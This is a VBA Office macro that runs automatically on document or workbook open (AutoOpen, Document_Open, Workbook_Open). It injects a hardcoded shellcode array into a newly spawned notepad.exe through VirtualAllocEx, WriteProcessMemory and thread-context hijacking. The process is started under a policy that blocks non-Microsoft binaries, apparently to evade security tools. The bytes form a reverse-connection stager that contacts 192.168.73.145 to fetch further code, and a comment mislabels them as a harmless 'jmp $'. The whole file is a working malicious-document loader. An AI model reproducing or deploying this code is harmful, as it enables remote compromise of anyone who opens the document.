Private Type PROCESS_HEAP_ENTRY
    lpData              As LongPtr
    cbData              As LongPtr
    cbOverhead          As Byte
    iRegionIndex        As Byte
    wFlags              As Integer
    dwCommittedSize     As LongPtr
    dwUnCommittedSize   As LongPtr
    lpFirstBlock        As LongPtr
    lpLastBlock         As LongPtr
End Type
Private Const PROCESS_HEAP_ENTRY_BUSY As Long = &H4
Private Const CRYPT_STRING_BINARY As Long = 2
Private Declare PtrSafe Function GetProcessHeaps Lib "kernel32" (ByVal NumberOfHeaps As Long, ByRef ProcessHeaps As Any) As Long
Private Declare PtrSafe Function HeapWalk Lib "kernel32" (ByVal hHeap As LongPtr, ByRef lpEntry As PROCESS_HEAP_ENTRY) As LongPtr
Private Declare PtrSafe Function ToString Lib "crypt32.dll" Alias "CryptBinaryToStringA" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, ByRef pcchString As LongPtr) As LongPtr
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr



Const EXTENDED_STARTUPINFO_PRESENT = &H80000
Const HEAP_ZERO_MEMORY = &H8&
Const SW_HIDE = &H0&
Const MAX_PATH = 260
Const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = &H20007
Const MAXIMUM_SUPPORTED_EXTENSION = 512
Const SIZE_OF_80387_REGISTERS = 80
Const MEM_COMMIT = &H1000
Const MEM_RESERVE = &H2000
Const PAGE_READWRITE = &H4
Const PAGE_EXECUTE_READWRITE = &H40
Const CONTEXT_FULL = &H10007

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUP_INFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Byte
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type
 
Private Type STARTUPINFOEX
    STARTUPINFO As STARTUP_INFO
    lpAttributelist As LongPtr
End Type

Private Type DWORD64
    dwPart1 As Long
    dwPart2 As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord As Long
    StatusWord As Long
    TagWord As Long
    ErrorOffset As Long
    ErrorSelector As Long
    DataOffset As Long
    DataSelector As Long
    RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte
    Spare0 As Long
End Type

Private Type CONTEXT
    ContextFlags As Long
    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long
    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
    ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As Byte
End Type

Private Declare PtrSafe Function CreateProcess Lib "kernel32.dll" Alias "CreateProcessA" ( _
    ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, _
    lpProcessAttributes As Long, _
    lpThreadAttributes As Long, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    lpEnvironment As Any, _
    ByVal lpCurrentDriectory As String, _
    ByVal lpStartupInfo As LongPtr, _
    lpProcessInformation As PROCESS_INFORMATION _
) As Long

Private Declare PtrSafe Function InitializeProcThreadAttributeList Lib "kernel32.dll" ( _
    ByVal lpAttributelist As LongPtr, _
    ByVal dwAttributeCount As Integer, _
    ByVal dwFlags As Integer, _
    ByRef lpSize As Integer _
) As Boolean

Private Declare PtrSafe Function UpdateProcThreadAttribute Lib "kernel32.dll" ( _
    ByVal lpAttributelist As LongPtr, _
    ByVal dwFlags As Integer, _
    ByVal lpAttribute As Long, _
    ByVal lpValue As LongPtr, _
    ByVal cbSize As Integer, _
    ByRef lpPreviousValue As Integer, _
    ByRef lpReturnSize As Integer _
) As Boolean

Private Declare Function WriteProcessMemory Lib "kernel32.dll" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpBaseAddress As Long, _
    ByRef lpBuffer As Any, _
    ByVal nSize As Long, _
    ByVal lpNumberOfBytesWritten As Long _
) As Boolean

Private Declare Function ResumeThread Lib "kernel32.dll" (ByVal hThread As LongPtr) As Long

Private Declare PtrSafe Function GetThreadContext Lib "kernel32.dll" ( _
    ByVal hThread As Long, _
    lpContext As CONTEXT _
) As Long

Private Declare Function SetThreadContext Lib "kernel32.dll" ( _
    ByVal hThread As Long, _
    lpContext As CONTEXT _
) As Long

Private Declare PtrSafe Function HeapAlloc Lib "kernel32.dll" ( _
    ByVal hHeap As LongPtr, _
    ByVal dwFlags As Long, _
    ByVal dwBytes As Long _
) As LongPtr

Private Declare PtrSafe Function GetProcessHeap Lib "kernel32.dll" () As LongPtr

Private Declare Function VirtualAllocEx Lib "kernel32" ( _
    ByVal hProcess As Long, _
    ByVal lpAddress As Long, _
    ByVal dwSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long _
) As Long






Function DocMacro()

    Dim pak As Variant
    Dim pakLen As Integer
    Dim b64Str1 As String
    Dim b64Str2 As String
    Dim b64Str As String




    Dim pi As PROCESS_INFORMATION
    Dim si As STARTUPINFOEX
    Dim nullStr As String
    Dim pid, result As Integer
    Dim threadAttribSize As Integer
    Dim processPath As String
    Dim val As DWORD64
    Dim ctx As CONTEXT
    Dim alloc As Long
    Dim shellcode As Variant
    Dim myByte As Long
    
    ' Shellcode goes here (jmp $)
    shellcode = Array(252,232,143,0,0,0,96,49,210,100,139,82,48,139,82,12,139,82,20,137,229,15,183,74,38,49,255,139,114,40,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,87,139,66,60,1,208,139,64,120,133,192,116,76,1,208,80,139,72,24,139,88,32,1,211,133,201,116,60,73,139, _
52,139,49,255,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84, _
104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,115,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,77,97,99,105,110,116,111,115,104,59,32,73,110,116,101,108,32,77,97,99,32,79,83,32,88,32,49,51,95,49,41,32,65,112,112,108,101,87,101,98,75,105,116,47,53,51,55,46, _
51,54,32,40,75,72,84,77,76,44,32,108,105,107,101,32,71,101,99,107,111,41,32,67,104,114,111,109,101,47,49,48,56,46,48,46,48,46,48,32,83,97,102,97,114,105,47,53,51,55,46,51,54,0,104,58,86,121,167,255,213,83,83,106,3,83,83,106,53,232,224,0,0,0,47,50,71,88,122,75, _
49,122,86,54,89,116,89,50,49,110,97,79,121,89,88,80,81,55,53,73,116,68,81,48,88,116,85,102,90,107,55,103,104,86,45,104,119,79,55,115,90,118,108,100,97,105,76,107,74,87,86,87,122,75,108,104,119,52,97,49,116,103,107,121,109,78,112,69,81,97,110,66,117,89,68,116,109,51,73,88, _
52,97,77,107,98,69,87,121,74,115,99,79,90,88,0,80,104,87,137,159,198,255,213,137,198,83,104,0,2,104,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,225,232, _
75,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,127,255,255,255,49,57,50,46,49,54,56,46,55,51,46,49,52,53,0,187, _
240,181,162,86,106,0,83,255,213)
    
    ' Path of process to spawn
    processPath = "C:\\windows\\system32\\notepad.exe"
    
    ' Specifies PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
    val.dwPart1 = 0
    val.dwPart2 = &H1000

    ' Initialize process attribute list
    result = InitializeProcThreadAttributeList(ByVal 0&, 1, 0, threadAttribSize)
    si.lpAttributelist = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, threadAttribSize)
    result = InitializeProcThreadAttributeList(si.lpAttributelist, 1, 0, threadAttribSize)

    ' Set our mitigation policy
    result = UpdateProcThreadAttribute( _
        si.lpAttributelist, _
        0, _
        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, _
        VarPtr(val), _
        Len(val), _
        ByVal 0&, _
        ByVal 0& _
        )

    si.STARTUPINFO.cb = LenB(si)
    si.STARTUPINFO.dwFlags = 1


    result = CreateProcess( _
        nullStr, _
        processPath, _
        ByVal 0&, _
        ByVal 0&, _
        1&, _
        &H80014, _
        ByVal 0&, _
        nullStr, _
        VarPtr(si), _
        pi _
    )
    
    alloc = VirtualAllocEx( _
        pi.hProcess, _
        0, _
        11000, _
        MEM_COMMIT + MEM_RESERVE, _
        PAGE_EXECUTE_READWRITE _
    )
    

    For Offset = LBound(shellcode) To UBound(shellcode)
        myByte = shellcode(Offset)
        result = WriteProcessMemory(pi.hProcess, alloc + Offset, myByte, 1, ByVal 0&)
    Next Offset
    

    ctx.ContextFlags = CONTEXT_FULL
    result = GetThreadContext(pi.hThread, ctx)
    ctx.Eip = alloc
    result = SetThreadContext(pi.hThread, ctx)
    

    ResumeThread (pi.hThread)
End Function

Sub Document_Open()

    DocMacro
End Sub

Sub AutoOpen()

    DocMacro
End Sub

Sub Workbook_Open()
    DocMacro
End Sub


